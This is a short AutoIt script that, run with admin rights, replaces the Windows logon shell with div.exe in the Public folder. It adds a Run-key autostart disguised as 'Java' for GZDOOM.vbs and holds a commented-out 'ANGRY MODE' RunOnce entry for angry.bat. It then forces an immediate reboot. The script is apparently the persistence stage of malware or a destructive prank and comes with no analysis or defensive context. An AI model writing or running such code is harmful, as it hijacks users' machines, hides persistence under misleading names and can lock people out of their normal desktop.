#RequireAdmin
Run('reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d C:\Users\Public\div.exe /f')
Run('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Java /t REG_SZ /d C:\Users\Public\GZDOOM.vbs /f')
;ANGRY MODE Run('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v avaJ /t REG_SZ /d C:\Users\Public\angry.bat /f')
Run('shutdown /f /r /t 0')